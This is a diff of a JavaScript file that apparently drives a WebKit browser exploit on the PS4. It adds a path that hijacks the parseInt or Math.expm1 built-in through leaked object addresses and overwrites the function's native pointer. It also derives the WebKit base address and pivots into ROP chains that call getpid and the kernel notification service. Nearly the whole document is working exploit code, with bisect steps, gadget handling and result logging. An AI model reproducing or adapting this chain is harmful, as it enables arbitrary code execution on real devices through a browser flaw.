@@ -72,7 +72,9 @@ import {
 } from "./libkernel_resolve.js";
 import { probeLibkernelViaVtable } from "./vtable_lk_probe.js";
 import { createCrashLog } from "./log_persist.js";
-import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, firePivotSmoke,
+import { prepCoreNative, captureFromCarrier, fireCoreGetpid, fireCoreNotify, bisectCoreTriggerLite } from "./core_native.js";
+import { prepNativeChain, stageGetpid, stageUsleep, stageNotify, fireNativeCall, fireUsleep, fireNotify, firePivotSmoke,
+    resolvePivotBuiltin, firePivotTrigger,
     firePivotGetpid,
     layoutSmokeStack, layoutGetpidStack, bisectArmG0, bisectHookPivot, bisectHookPivotPoops,
     bisectFireExpm1, bisectFirePoopsStyle, bisectPreflight, G0_HOOK_OFFS, G0_HOOK_SAFE, G0_HOOK_POOPS,
@@ -88,7 +90,21 @@ import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, 
     prepGadgetRvaStale, refreshPrepSlabGadgets,
     CHAIN_POP_ROWS } from "./native_call.js";
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250831f";
+const BUILD_ID = "rw-20250831i";
+
+function usePoopsNativePath() {
+    return params.get("nativepath") === "poops";
+}
+
+function pivotBuiltinFromParams() {
+    if (!usePoopsNativePath())
+        return { fn: parseInt, name: "parseint-core" };
+    try {
+        return resolvePivotBuiltin(params.get("pivotfn") || "expm1");
+    } catch (e) {
+        return { fn: Math.expm1, name: "expm1" };
+    }
+}
 
 /** Notify bisect URL profiles — applied by Reload profile button. */
 const NOTIFY_PROFILES = {
@@ -455,7 +471,7 @@ function setUi() {
             btnNative.title = "lk hot — Fire getpid without reload";
         } else if (nm === "notify") {
             btnNative.textContent = "Fire notify";
-            btnNative.title = "Collator.compare → notification (no expm1 pivot)";
+            btnNative.title = "expm1 ROP → sceKernelSendNotificationRequest (PS4 path)";
         } else {
             btnNative.textContent = nm === "smoke" ? "Fire smoke" : (nm === "usleep" ? "Fire usleep" : "Fire getpid");
             btnNative.title = "smoke: set before Start, or Verify pivot then Fire";
@@ -4413,20 +4429,46 @@ async function loadNotifySk() {
     return notifySkModule;
 }
 
-/** Capture expm1 + slab once at PRIMITIVE-OK — before any other taps eat heap. */
+/** Capture mainMf — default: slopkit-core carrier (parseInt). ?nativepath=poops for legacy expm1. */
 function ensureNativePrep(p, off) {
     if (nativePrep) return nativePrep;
-    const cap = captureMainMfForPrep(p, off);
+    const carrier = window._wkCarrier;
+    const hookMode = pivotHookMode();
+
+    if (!usePoopsNativePath() && carrier) {
+        try {
+            nativePrep = prepCoreNative(p, off, carrier);
+            nativePrep._pinMainMf = nativePrep.mainMf;
+            nativePrep._pinMainOrig = nativePrep.mainOrig;
+            mark("NATIVE-PREP", "CORE parseInt+textarea path="
+                + (nativePrep._cap && nativePrep._cap.path || "?")
+                + " mainMf=" + nativePrep.mainMf
+                + " pivotCell=" + nativePrep.pivotCell
+                + " wb=" + nativePrep.webkitBase
+                + " hook=" + hookMode);
+            pinNativeRetain();
+            return nativePrep;
+        } catch (coreErr) {
+            mark("NATIVE-PREP-WARN", "core path failed: " + (coreErr.message || coreErr)
+                + " — fallback poops");
+        }
+    }
+
+    const pivot = pivotBuiltinFromParams();
+    const cap = captureMainMfForPrep(p, off, pivot.fn);
+    cap.pivotTrigger = pivot.fn;
+    cap.pivotBuiltinName = pivot.name;
     const { mainMf, mainOrig, nativeFn, path, cell, jfn } = cap;
     const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
     persistSessionBases(nativeFn, webkitBase, { trust: "rw" });
-    nativePrep = prepNativeChain(p, off, webkitBase, { mainMf, mainOrig });
-    finishPivotObj(p, nativePrep, window._wkCarrier);
-    nativePrep._cap = { path, cell, jfn };
+    nativePrep = prepNativeChain(p, off, webkitBase, cap);
+    finishPivotObj(p, nativePrep, carrier);
+    nativePrep._cap = { path, cell, jfn, pivotfn: pivot.name, nativepath: "poops" };
     nativePrep._pinMainMf = mainMf;
     nativePrep._pinMainOrig = mainOrig;
     const pivTag = params.get("pivot") || "empty";
-    mark("NATIVE-PREP", "mainMf " + path + " pivot=" + pivTag
+    mark("NATIVE-PREP", "POOPS " + path + " pivotfn=" + pivot.name
+        + " pivot=" + pivTag
         + " cell=" + nativePrep.pivotCell
         + " bufAddr=" + (nativePrep._bufAddrOff && nativePrep._bufAddrOff.via || "?")
         + " G0code="
@@ -4689,12 +4731,7 @@ function bisectRunPoopsFire(p, off, hookOffs, tag) {
 
 function requireNativePrep() {
     if (nativePrep) return;
-    const nm = getNativeMode();
-    if (nm === "notify") {
-        throw new Error("no expm1 slab — notify mode skips prep @ Start. "
-            + "N0 bisect needs smoke/getpid in dropdown BEFORE Start + reload, or N1 (heavy, often OOMs)");
-    }
-    throw new Error("no prep — Start in smoke/getpid mode (PREP-PIN @ Start) or tap N1");
+    throw new Error("no prep — Start first (PREP-PIN @ Start) or tap N1");
 }
 
 function pivotObjForPrep(carrier, prep) {
@@ -4771,9 +4808,10 @@ function codeLooksNative(code4) {
 }
 
 /** cal-style — prefer fixed jfn+m_function (chain_poops); scan only if fixed slot bad. */
-function captureMainMfForPrep(p, off) {
+function captureMainMfForPrep(p, off, pivotFn) {
+    const builtin = pivotFn || Math.expm1;
     const mOff = off.wk_JSFunction_m_function || 0x28;
-    const cell = p.leakval(Math.expm1);
+    const cell = p.leakval(builtin);
     const jfn = read8p(p, cell.add32(0x18));
     if (!jfn) throw new Error("no JSFunction @ expm1 cell+0x18");
     const fnFixed = read8p(p, jfn.add32(mOff));
@@ -5066,8 +5104,11 @@ function runNativeBisectStep(stepId) {
             if (!nativePrep.mainArmed) bisectArmG0(p, nativePrep);
             bisectSnapshot(p, nativePrep, off, "pre-N5a");
             bisectFlushBeforeFire();
-            bisectLog("BISECT-WARN", "N5a expm1(1) — OOM EXPECTED (G0 runs, NO hook)");
-            Math.expm1(1);
+            bisectLog("BISECT-WARN", "N5a " + (nativePrep.pivotBuiltinName || "parseint") + "(1) — OOM EXPECTED (G0 runs, NO hook)");
+            if (nativePrep._coreNative)
+                bisectCoreTriggerLite(p, nativePrep);
+            else
+                firePivotTrigger(nativePrep, 1);
             bisectLog("BISECT-OK", "N5a expm1(1) survived (unexpected — G0 may not have run)");
             state("N5a OK", "ok");
             break;
@@ -5078,8 +5119,8 @@ function runNativeBisectStep(stepId) {
             if (!nativePrep.mainArmed) bisectArmG0(p, nativePrep);
             bisectSnapshot(p, nativePrep, off, "pre-N5c");
             bisectFlushBeforeFire();
-            bisectLog("BISECT-WARN", "N5c Math.expm1(pivotObj) — G0 armed, NO hook (OOM expected)");
-            Math.expm1(nativePrep.pivotObj);
+            bisectLog("BISECT-WARN", "N5c " + (nativePrep.pivotBuiltinName || "expm1") + "(pivotObj) — G0 armed, NO hook (OOM expected)");
+            firePivotTrigger(nativePrep);
             bisectLog("BISECT-OK", "N5c expm1(obj) survived");
             state("N5c OK", "ok");
             break;
@@ -5304,95 +5345,63 @@ async function runFireNotify() {
     const off = loadEffectiveOff();
     const lk = lkFromUi();
     if (!lk) {
-        mark("NOTIFY-SKIP", "2e → paste k_usleep fn → Accept fn → Fire notify");
+        mark("NOTIFY-SKIP", "paste k_usleep fn → Accept fn → Fire notify");
         state("need lk — Accept fn", "warn");
+        renderOut();
+        return;
+    }
+    if (!gateNativeFire(p, off)) {
+        state("pivot not ready — Verify pivot", "warn");
         renderOut();
         return;
     }
 
     busy = true;
     nativeQuiet = true;
-    notifyStage("NOTIFY-F01", "Fire tap build=" + BUILD_ID + " lk=" + lk);
+    lkQuiet = true;
+    mark("NOTIFY-F01", "expm1 ROP notify build=" + BUILD_ID + " lk=" + lk);
 
+    let errMsg = null;
+    let result = -1;
     try {
-        notifyStage("NOTIFY-F02", "trimExploitDebris");
-        try {
-            const coreMod = await import("./core.js");
-            coreMod.trimExploitDebris();
-            notifyStage("NOTIFY-F02-OK", "groom freed");
-        } catch (trimErr) {
-            notifyStage("NOTIFY-F02-SKIP", trimErr && trimErr.message ? trimErr.message : "trim skip");
-        }
-
-        notifyStage("NOTIFY-F02b", "freeHeapBeforeNotifyFire");
-        freeHeapBeforeNotifyFire();
-        notifyPrep = null;
-
-        const sk = await loadNotifySk();
-        let bases;
-        try {
-            bases = notifySessionBases(p, off);
-        } catch (err) {
-            mark("NOTIFY-FAIL", "bases: " + (err.message || String(err)));
-            state("bases failed", "bad");
-            return;
-        }
-        const fireFlush = function () {
-            renderOut();
-            try { crashLog.flushSync(); } catch (_) { }
-        };
-        notifyStage("NOTIFY-F09", "runNotifyAtomic sync pin+fire");
-        const fireParams = notifyParamsWithGd();
-        const out = sk.runNotifyAtomic({
-            p,
-            off,
-            lk,
-            leakval: p.leakval,
-            webkitBase: bases.webkitBase,
-            nativeFn: bases.nativeFn,
-            retain: notifyRetain,
-            params: fireParams,
-            log: notifyStage,
-            flush: fireFlush,
-            carrier: window._wkCarrier || null,
-        });
-        if (out.gdCheckOnly) {
-            mark("NOTIFY-GD-DONE", out.ok ? "PASS" : "FAIL");
-            state(out.ok ? "gd OK" : "gd BAD", out.ok ? "ok" : "bad");
-            return;
-        }
-        for (let i = 0; i < notifyRetain.length; i++)
-            retained.push(notifyRetain[i]);
-        notifyPrep = { arenaMode: true };
-        if (out.sent) {
-            mark("NOTIFY-OK", "system toast result=0 build=" + BUILD_ID);
-            state("notification sent — check PS4 toast", "ok");
-            try {
-                saveLibkernelSession(lk, null, { forced: true });
-                crashLog.append("NOTIFY-OK result=0", "NOTIFY-OK");
-            } catch (_) { }
-        } else if (out.ok) {
-            mark("NOTIFY-RET", "syscall returned " + out.result + " (want 0)");
-            state("notify errno " + out.result, "warn");
+        ensureNativePrepForFire(p, off, "notify");
+        pinNativeRetain();
+        mark("NOTIFY-F09", "stageNotify + fireNativeCall @ k_notify");
+        if (nativePrep && nativePrep._coreNative) {
+            result = fireCoreNotify(p, nativePrep, lk, off, pivotHookMode());
         } else {
-            mark("NOTIFY-FAIL", "bad return " + out.result);
-            state("notify failed", "bad");
+            result = fireNotify(p, nativePrep, lk, off, { fireOpts: nativeFireOpts(pivotHookMode()) });
         }
     } catch (err) {
-        const em = err && err.message ? err.message : String(err);
-        mark("NOTIFY-FAIL", em + " build=" + BUILD_ID);
-        mark("NOTIFY-HINT", "S25 OOM: ?notifysmoke=usleep or ?notifybisect=1 — RE gd ?gd=0x…");
-        state("notify failed: " + em.slice(0, 60), "bad");
-        try {
-            crashLog.append("NOTIFY-FAIL " + em, "NOTIFY-FAIL");
-        } catch (_) { }
-    } finally {
-        nativeQuiet = false;
-        busy = false;
-        setUi();
-        renderOut();
-        try { crashLog.flushSync(); } catch (_) { }
+        errMsg = err && err.message ? err.message : String(err);
     }
+
+    nativeQuiet = false;
+    lkQuiet = false;
+    nativeStaged = false;
+    busy = false;
+
+    if (!errMsg && result === 0) {
+        mark("NOTIFY-OK", "toast result=0 build=" + BUILD_ID);
+        state("notification sent — check PS4 toast", "ok");
+        try {
+            saveLibkernelSession(lk, null, { forced: true });
+            crashLog.append("NOTIFY-OK result=0", "NOTIFY-OK");
+        } catch (_) { }
+    } else if (!errMsg) {
+        mark("NOTIFY-RET", "errno " + result + " (want 0)");
+        state("notify errno " + result, "warn");
+    } else {
+        mark("NOTIFY-FAIL", errMsg + " build=" + BUILD_ID);
+        mark("NOTIFY-HINT", "core path OOM? bisect N5a — legacy poops: ?nativepath=poops");
+        state("notify failed: " + errMsg.slice(0, 60), "bad");
+        try { crashLog.append("NOTIFY-FAIL " + errMsg, "NOTIFY-FAIL"); } catch (_) { }
+    }
+    lkHot = false;
+    pivotReady = true;
+    setUi();
+    renderOut();
+    try { crashLog.flushSync(); } catch (_) { }
 }
 
 function runFireGetpid() {
@@ -5448,8 +5457,12 @@ function runFireGetpid() {
             if (!stub.verified)
                 throw new Error("getpid stub not found — re-Accept lk with usleep fn ptr");
             mark("NATIVE-STUB", "getpid " + stub.tag + " addr=" + stub.addr);
-            stageGetpid(p, nativePrep, lk, off, stub.off, nativeFireOpts(pivotHookMode(), stub));
-            pid = fireNativeCall(p, nativePrep, off, nativeFireOpts(pivotHookMode()));
+            if (nativePrep._coreNative) {
+                pid = fireCoreGetpid(p, nativePrep, lk, off, pivotHookMode());
+            } else {
+                stageGetpid(p, nativePrep, lk, off, stub.off, nativeFireOpts(pivotHookMode(), stub));
+                pid = fireNativeCall(p, nativePrep, off, nativeFireOpts(pivotHookMode()));
+            }
         }
     } catch (err) {
         errMsg = err.message || String(err);
@@ -5475,7 +5488,7 @@ function runFireGetpid() {
         state("getpid OK pid=" + pid, "ok");
     } else {
         mark("NATIVE-FAIL", (errMsg || "fire failed") + " build=" + BUILD_ID);
-        mark("NATIVE-HINT", "pivot OOM — tap Verify pivot, fix PIVOT-BAD lines before Fire smoke");
+        mark("NATIVE-HINT", "core parseInt OOM — bisect N5a; legacy: ?nativepath=poops");
         state("native fire failed", "bad");
     }
     lkHot = false;
@@ -5723,27 +5736,22 @@ async function runStart() {
         const off = loadEffectiveOff();
         const nm = getNativeMode();
         try {
-            if (nm === "notify" && params.get("prepslab") !== "1") {
-                mark("NATIVE-HINT", "notify — Accept fn → Fire (atomic). S25? ?notifysmoke=usleep");
-                loadNotifySk().catch(function () { });
-            } else {
-                ensureNativePrep(p, off);
-                mark("NATIVE-PREP", "slab ready @ Start build=" + BUILD_ID + " native=" + nm);
-                mark("PREP-PIN", "bisect N0 or N2→N5 skip N1 — hook=" + pivotHookMode()
-                    + " bufAddr=" + (nativePrep._bufAddrOff && nativePrep._bufAddrOff.via || "?"));
-                if (params.get("smoke") === "1" && nativeAllowed && nm === "smoke") {
-                    mark("SMOKE-NOW", "atomic smoke @ PRIMITIVE-OK (?smoke=1)");
-                    renderOut();
-                    try {
-                        firePivotSmoke(p, nativePrep, off, nativeFireOpts(pivotHookMode()));
-                        mark("NATIVE-OK", "smoke @ PRIMITIVE-OK build=" + BUILD_ID);
-                        state("pivot smoke OK @ Start", "ok");
-                    } catch (smokeErr) {
-                        mark("NATIVE-FAIL", "smoke @ Start: " + (smokeErr.message || smokeErr));
-                    }
-                } else {
-                    tryNativeFireAtStart(p, off);
+            ensureNativePrep(p, off);
+            mark("NATIVE-PREP", "slab ready @ Start build=" + BUILD_ID + " native=" + nm);
+            mark("PREP-PIN", "bisect N0 or N2→N5 skip N1 — hook=" + pivotHookMode()
+                + " bufAddr=" + (nativePrep._bufAddrOff && nativePrep._bufAddrOff.via || "?"));
+            if (params.get("smoke") === "1" && nativeAllowed && nm === "smoke") {
+                mark("SMOKE-NOW", "atomic smoke @ PRIMITIVE-OK (?smoke=1)");
+                renderOut();
+                try {
+                    firePivotSmoke(p, nativePrep, off, nativeFireOpts(pivotHookMode()));
+                    mark("NATIVE-OK", "smoke @ PRIMITIVE-OK build=" + BUILD_ID);
+                    state("pivot smoke OK @ Start", "ok");
+                } catch (smokeErr) {
+                    mark("NATIVE-FAIL", "smoke @ Start: " + (smokeErr.message || smokeErr));
                 }
+            } else {
+                tryNativeFireAtStart(p, off);
             }
         } catch (prepErr) {
             mark("NATIVE-PREP-SKIP", prepErr.message || String(prepErr));
@@ -5751,7 +5759,7 @@ async function runStart() {
         renderOut();
         const nmHint = getNativeMode();
         if (nmHint === "notify") {
-            mark("HINT", "notify mode — Fire notify OR bisect N0 needs ?native=smoke before Start");
+            mark("HINT", "notify = expm1 ROP (same as getpid). Verify pivot → Accept fn → Fire");
             state("primitive OK — Accept fn → Fire notify", "ok");
         } else if (nmHint === "smoke" || nmHint === "getpid") {
             mark("HINT", "PREP-PIN @ Start — skip N1, Verify pivot, bisect N2→N0");
